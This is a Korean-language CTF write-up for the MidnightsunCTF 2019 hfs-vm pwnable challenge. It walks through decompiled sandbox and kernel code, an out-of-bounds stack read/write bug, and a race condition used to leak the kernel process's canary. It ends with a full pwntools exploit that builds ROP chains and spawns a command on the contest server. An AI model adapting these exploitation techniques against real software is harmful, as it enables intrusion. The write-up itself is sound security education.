---
layout:     post
title:      "MidnightsunCTF 2019 hfs-vm1,2 WriteUp"
subtitle:   "MidnightsunCTF 2019 pwnable"
date:       2019-08-07
author:     "NextLine"
header-img: "img/post-bg-3.png"
tags:
    - WriteUp
---

# MidnightsunCTF 2019 hfs-vm1,2 WriteUp

### 1. Intro

대회 때 분석도 빨리하고 escape도 금방 했는데 레컨을 못찾아서 10시간넘게 헤맸다. 하필 대회 끝나기 10분전에 찾아서 결국 끝나고 푼 문제다.. bof로 환경변수를 덮을 수 있고 system 함수도 쓰고 uid를 주기도 하고 이상한 페이크가 많아서 레컨을 너무 늦게 찾은것같다. 앞으로는 이런실수 안하게 기억해두고 봐야겠다.


### 2. Binary

```c
if ( !socketpair(1, 1, 0, fds) )
  {
    mapping = mmap(0LL, 0x102uLL, 3, 33, -1, 0LL);
    pid = fork();
    if ( pid != -1 )
    {
      if ( pid )
      {
        v3 = -1;
        close(fds[0]);
        fd = fopen("/dev/urandom", "rb");
        v7 = fd;
        if ( fd )
        {
          fread(&random, 8uLL, 1uLL, fd);
          fclose(v7);
          set_canary(random);
          v8 = kernel(fds[1]);
          exit(v8);
        }
      }
      else
      {
        close(fds[1]);
        v3 = sandbox(fds[0]);
      }
    }
  }
  return v3;
}
```

main 구조는 kernel을 먼저 실행하고 fork 프로세스로 sandbox를 실행한다. sandbox를 실행할 때는 prctl을 걸어 read/write/exit 밖에 못하도록 만들고 syscall을 통해 kernel에 접근할 수 있다.
또한 두 프로세스가 공유하는 메모리는 mmap으로 만든 메모리밖에 없으며 kernel을 실행하기 전에 canary를 초기화해서 sandbox와 kernel의 canary가 다르다.

```c
case 0:
        sb_mov(info, opcode);
        break;
      case 1:
        sb_add(info, opcode);
        break;
      case 2:
        sb_sub(info, opcode);
        break;
      case 3:
        sb_xchg(info, opcode);
        break;
      case 4:
        sb_xor(info, opcode);
        break;
      case 5:
        sb_push(info, opcode);
        break;
      case 6:
        sb_pop(info, opcode);
        break;
      case 7:
        sb_vuln1(info, opcode);
        break;
      case 8:
        sb_vuln2(info, opcode);
        if ( info->regi[14] > 0x20u )
          goto LABEL_11;
        goto LABEL_6;
      case 9:
        if ( !sb_syscall(info) )
          break;
        fwrite("[!] Syscall failed!\n", 1uLL, 0x14uLL, stderr);
        return 1LL;
      case 0xA:
        sb_debug(info);
        break;
```
위의 코드는 sandbox에서 사용할 수 있는 instruction이다.

```c
  len2 = stack_len;
  memcpy(buf, mapping + 1, stack_len);
  re = *stack1;
  switch ( re )
  {
    case 0:
      kernel_ls();
      goto LABEL_3;
    case 1:
      krenel_fwrite(buf, len2);
      goto LABEL_3;
    case 2:
      if ( kernel_getuid(*(stack1 + 1), buf, len2) )
        goto LABEL_6;
      goto LABEL_3;
    case 3:
      if ( !kernel_getflag1(buf, len2) )
        goto LABEL_3;
      goto LABEL_6;
    case 4:
      if ( kernel_random(*(stack1 + 1), buf, len2) )
      {
LABEL_6:
        re = 0xFFFFFFFFLL;
      }
      else
      {
LABEL_3:
        memcpy(mapping + 1, buf, *mapping);
        re = 0LL;
      }
      break;
    default:
      return re;
```

커널에서 사용할 수 있는 syscall은 위와 같이 5개이며 syscall 3에서 flag1(rev)을 준다.


### 3. Vulnerability

```c
unsigned __int64 __fastcall sb_vuln1(Info *a1, unsigned int a2)
{
  __int64 v2; // rax
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]
  v4 = __readfsqword(0x28u);
  v2 = a1->regi[(a2 >> 5) & 0xF];
  if ( a2 & 0x2000 )
    *&a1->stack[2 * v2] = HIWORD(a2);
  else
    *&a1->stack[2 * v2] = a1->regi[(a2 >> 9) & 0xF];
  return __readfsqword(0x28u) ^ v4;
}

```
```c
unsigned __int64 __fastcall sb_vuln2(Info *a1, unsigned int a2)
{
  unsigned __int64 v2; // ST08_8
  v2 = __readfsqword(0x28u);
  a1->regi[(a2 >> 5) & 0xF] = *&a1->stack[2 * a1->regi[(a2 >> 9) & 0xF]];
  return __readfsqword(0x28u) ^ v2;
}
```

취약점은 sandbox의 함수에서 발생한다. register에 있는 값만큼 stack에서 read/write가 가능해 stack의 범위를 벗어난 read/write를 하면 out of bounds 취약점이 발생한다. 이를 통해 libc, heap, pie, stack 등 모든 메모리주소를 leak할 수 있고 ret을 덮어써 ROP를 할 수 있다.

### 4. Exploit

sandbox에서 모든 메모리에 대한 leak을 얻고, rip를 제어할 수 있는 상황에서 kernel 프로세스를 exploit해야 한다.

```c
  stack_len = *mapping;
  len2 = stack_len;
  memcpy(buf, mapping + 1, stack_len);
  re = *stack1;
  switch ( re )
  {
    case 0:
      kernel_ls();
      goto LABEL_3;
...
```

위 코드에서 (kernel syscall 처리) 이미 mapping된 주소에 우리가 원하는 값을 쓸 수 있기 때문에 bof를 발생시킬 수 있다. (sandbox 프로세스에서 oob이용)
하지만 kernel의 canary는 알 수 없기 때문에 바로 rip를 컨트롤 할 수 없다.

```c
signed __int64 __fastcall kernel_random(char buf, void *stack, unsigned __int16 size)
{
  size_t _len; // r12
  FILE *fd; // rax
  int v5; // ebx
  FILE *_fd; // r13
  _len = size;
  fd = fopen("/dev/urandom", "rb");
  if ( !fd )
    return 0xFFFFFFFFLL;
  v5 = 0;
  _fd = fd;
  if ( buf & 4 )
  {
    do
    {
      ++v5;
      fread(stack, _len, 1uLL, _fd);
      sleep(1u);
    }
    while ( v5 < (buf & 4) );
  }
  fclose(_fd);
  return 0LL;
}
```
syscall 중에 random 값을 stack에 돌려주는 함수가 있는데, 이때 sleep을 약 4초간 진행한다.


```c
  stack_len = *mapping;
  v6 = __readfsqword(0x28u);
  len2 = stack_len;
  memcpy(buf, mapping + 1, stack_len);
  re = *stack1;
  switch ( re )
  {
    case 0:
      kernel_ls();
      goto LABEL_3;
    case 1:
...
      }
      else
      {
LABEL_3:
        memcpy(mapping + 1, buf, *mapping);
        re = 0LL;
      }
      break;
    default:
      return re;
```

syscall 처리 이후에 사용한 stack을 돌려주는데 sleep 도중에 mapping된 영역을 덮어쓰면 돌려주는 size를 크게 수정할 수 있었다. 이 레이스컨디션 취약점을 이용해 kernel 프로세스의 canary를 leak하고 system 함수를 호출해 쉘을 획득하면 된다.

```python
#from ntpwn import *
from pwn import *
LOCAL = 1
#debug()
def conn():
    if LOCAL:
        s = process('./hfs-vm')
        #b = NT(s)
        # sandbox
        #b.bp(0x1640)
        #b.bp(0x1113)
        #b.ex('set follow-fork-mode child')
        # kernel
        #b.bp(0x1d20)
        #b.bp(0x1d9b)
        #b.end()
    else:
        s = remote('hfs-vm-01.play.midnightsunctf.se',4096)
        #s = remote('10.211.55.5',12345)
    return s
s = conn()
sla = s.sendlineafter
sa = s.sendafter
def make(opcode, opr1, opr2, addr = 0):
    op = 0
    op |= opcode
    op |= opr1 << 5
    op |= opr2 << 9
    if (addr):
        op |= 1 << 13
        op |= addr << 0x10
    return op
def leak(off):
    global payload
    for i in range(4):
        payload += p32(make(0, 13, 0, off+i))
        payload += p32(make(8, i, 13, 0))
    payload += p32(make(10, 0, 0, 0x0))
def leak2():
    a = []
    s.recvuntil('Registers:')
    for i in range(4):
        s.recvuntil(': ')
        a.append(int(s.recvline(),16))
    re = a[0]
    re += a[1] * (0x10 ** 4)
    re += a[2] * (0x10 ** 8)
    re += a[3] * (0x10 ** 12)
    return re
def pierop(off, val, flag, val2 = 0):
    global payload
    for i in range(4):
        payload += p32(make(0, 13, 0, 0x34+i))
        payload += p32(make(8, i, 13, 0))
    if flag: # add
        payload += p32(make(1, 0, 0, val))
    else: # sub
        payload += p32(make(2, 0, 0, val))
    if val2:
        payload += p32(make(1, 1, 0, val2))
    for i in range(4):
        payload += p32(make(0, 13, 0, off+i))
        payload += p32(make(7, 13, i, 0))
prdi = 0x0000000000001e83
prsi = 0x000000000000198f
prdx = 0x000000000000101d
prsp = 0x0000000000001112
read = 0xca0
write = 0xc10
bss = [0x3200,0x20]
#pause()
payload = ''
# ls
payload += p32(make(9, 0, 0, 0))
leak(0x48)
leak(0xc4)
leak(0x34)
leak(0x54)
# prdi + 0
pierop(0x34,prdi-0xe6e,1)
for i in range(4):
    payload += p32(make(0, 13, 0, 0x38+i))
    payload += p32(make(7, 13, 10, 0))
# prsi + bss
pierop(0x3c,prdi-prsi,0)
pierop(0x40,bss[0]-prdi,1,bss[1])
# prdx + size(0x100)
pierop(0x44,prdi-prdx,0)
payload += p32(make(0, 10, 0, 0x500))
payload += p32(make(0, 13, 0, 0x48))
payload += p32(make(7, 13, 10, 0))
payload += p32(make(0, 10, 11, 0))
for i in range(1,4):
    payload += p32(make(0, 13, 0, 0x48+i))
    payload += p32(make(7, 13, 10, 0))
# read
pierop(0x4c,prdi-read,0)
# prsp + bss
pierop(0x50,prdi-prsp,0)
pierop(0x54,bss[0]-prdi,1,bss[1])
sla('length: ',str(len(payload)))
sa('code: ', payload)
stack = leak2() - 0x1d0
envp = leak2()
pie = leak2() - 0xe6e
addr = leak2() + 0x5cd7d0
s.info("stack @ " + hex(stack))
s.info("envp @ " + hex(envp))
s.info("off @ " + hex(envp-stack))
s.info("pie @ " + hex(pie))
s.info("mmap @ " + hex(addr))
payload2 = p64(pie+prdi) + p64(0)
payload2 += p64(pie+prsi) + p64(addr)
payload2 += p64(pie+prdx) + p64(0x1000)
payload2 += p64(pie+read)
# leak stack
payload2 += p64(pie+prdi) + p64(3)
payload2 += p64(pie+prsi) + p64(pie+0x203200+0x300)
payload2 += p64(pie+prdx) + p64(10)
payload2 += p64(pie+write)
payload2 += p64(pie+prdi) + p64(0)
payload2 += p64(pie+prsi) + p64(addr)
payload2 += p64(pie+prdx) + p64(0x100)
payload2 += p64(pie+read)
payload2 += p64(pie+prdi) + p64(0)
payload2 += p64(pie+prsi) + p64(addr)
payload2 += p64(pie+prdx) + p64(0x100)
payload2 += p64(pie+read)
payload2 += p64(pie+prdi) + p64(3)
payload2 += p64(pie+prsi) + p64(pie+0x203200+0x300+10)
payload2 += p64(pie+prdx) + p64(5)
payload2 += p64(pie+write)
payload2 += p64(pie+prdi) + p64(0)
payload2 += p64(pie+prsi) + p64(addr)
payload2 += p64(pie+prdx) + p64(0x100)
payload2 += p64(pie+read)
payload2 = payload2.ljust(0x300,'\x00')
payload2 += '\x04\x04\x00\x00\x00'
payload2 += '\x01\x00\x00\x00\x00'
payload2 += '\x00' * 5
#pause()
sleep(0.5)
s.send(payload2)
pause()
payload3 = p16(0x20) + 'A' * 0x20
s.send(payload3)
pause()
payload3 = p16(0x50)
s.send(payload3)
s.recvuntil("========================================\n")
s.recv(0x48)
canary = u64(s.recv(8))
s.info("canary : " + hex(canary))
pause()
payload3 = p16(0x100) + 'A' * 0x48 + p64(canary) + p64(0x4242424242424242) * 0x5
payload3 += p64(pie + prdi) + p64(addr+0x90+2) + p64(pie + 0xc60)
payload3 = payload3.ljust(0x90,'B')
payload3 += 'cat flag2'
s.send(payload3)
s.interactive()
```
